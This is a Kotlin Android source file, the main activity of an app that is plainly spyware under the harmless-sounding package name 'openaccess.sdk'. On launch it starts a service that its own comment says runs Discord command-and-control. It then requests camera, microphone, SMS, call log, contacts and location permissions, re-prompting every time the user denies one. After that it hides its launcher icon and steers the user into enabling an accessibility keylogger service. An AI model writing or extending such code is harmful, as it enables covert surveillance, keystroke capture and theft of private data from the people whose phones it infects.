package com.openaccess.sdk

import android.Manifest
import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityManager
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.openaccess.sdk.service.KeylogService
import com.openaccess.sdk.service.MainService

class MainActivity : Activity() {
    companion object {
        private const val TAG = "MainActivity"
        private const val RC_ALL = 100
        private const val RC_MANAGE_STORAGE = 101

        val ALL_PERMS = listOfNotNull(
            Manifest.permission.CAMERA,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.WRITE_CONTACTS,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION,
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) Manifest.permission.READ_EXTERNAL_STORAGE else null,
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) Manifest.permission.WRITE_EXTERNAL_STORAGE else null,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) Manifest.permission.POST_NOTIFICATIONS else null,
        )

        fun hasPermission(ctx: Context, perm: String): Boolean {
            return ContextCompat.checkSelfPermission(ctx, perm) == PackageManager.PERMISSION_GRANTED
        }

        fun isAccessibilityEnabled(ctx: Context): Boolean {
            return try {
                val am = ctx.getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
                val enabledServices = Settings.Secure.getString(
                    ctx.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                ) ?: ""
                val ourService = ComponentName(ctx, KeylogService::class.java).flattenToString()
                enabledServices.contains(ourService) && am.isEnabled
            } catch (_: Exception) {
                false
            }
        }

        fun openAccessibilitySettings(ctx: Context) {
            try {
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                ctx.startActivity(intent)
            } catch (_: Exception) {
                try {
                    val intent = Intent(Settings.ACTION_SETTINGS)
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    ctx.startActivity(intent)
                } catch (_: Exception) {}
            }
        }
    }

    private var permissionsGranted = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!isTaskRoot) { finish(); return }
        Log.i(TAG, "onCreate SDK=${Build.VERSION.SDK_INT}")

        // Step 1: Start the background service (runs Discord C2)
        try { MainService.start(this) } catch (e: Exception) { Log.e(TAG, "start: ${e.message}") }

        // Step 2: Request permissions FIRST — activity must stay alive for dialog
        requestAllPerms()
    }

    private fun requestAllPerms() {
        val needed = ALL_PERMS.filter { !hasPermission(this, it) }
        Log.i(TAG, "Permissions needed: ${needed.size}/${ALL_PERMS.size}")

        if (needed.isEmpty()) {
            Log.i(TAG, "All permissions already granted")
            onPermissionsReady()
        } else {
            Log.i(TAG, "Requesting: ${needed.joinToString(", ")}")
            ActivityCompat.requestPermissions(this, needed.toTypedArray(), RC_ALL)
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, perms: Array<String>, results: IntArray) {
        super.onRequestPermissionsResult(requestCode, perms, results)
        if (requestCode == RC_ALL) {
            val denied = perms.filterIndexed { i, _ -> results[i] != PackageManager.PERMISSION_GRANTED }
            val granted = perms.filterIndexed { i, _ -> results[i] == PackageManager.PERMISSION_GRANTED }

            if (granted.isNotEmpty()) {
                Log.i(TAG, "Granted: ${granted.joinToString(", ")}")
            }

            if (denied.isNotEmpty()) {
                Log.w(TAG, "Denied: ${denied.joinToString(", ")} — re-requesting")
                // Re-request denied permissions after short delay
                Handler(Looper.getMainLooper()).postDelayed({
                    if (!isFinishing && !isDestroyed) {
                        ActivityCompat.requestPermissions(this, denied.toTypedArray(), RC_ALL)
                    }
                }, 500)
            } else {
                onPermissionsReady()
            }
        }
    }

    private fun onPermissionsReady() {
        if (permissionsGranted) return
        permissionsGranted = true
        Log.i(TAG, "All permissions granted")

        // Step 3: Hide app icon from launcher
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            Log.e(TAG, "hide icon: ${e.message}")
        }

        // Step 4: Open Accessibility settings so user can enable it
        Handler(Looper.getMainLooper()).postDelayed({
            if (!isFinishing && !isDestroyed) {
                if (!isAccessibilityEnabled(this)) {
                    Log.i(TAG, "Opening Accessibility settings")
                    openAccessibilitySettings(this)
                }
                // Finish activity after settings opens
                finish()
            }
        }, 300)
    }

    override fun onResume() {
        super.onResume()
        // Re-check permissions on every resume
        if (!permissionsGranted) {
            val stillNeeded = ALL_PERMS.filter { !hasPermission(this, it) }
            if (stillNeeded.isEmpty()) {
                onPermissionsReady()
            } else {
                requestAllPerms()
            }
        }
    }
}
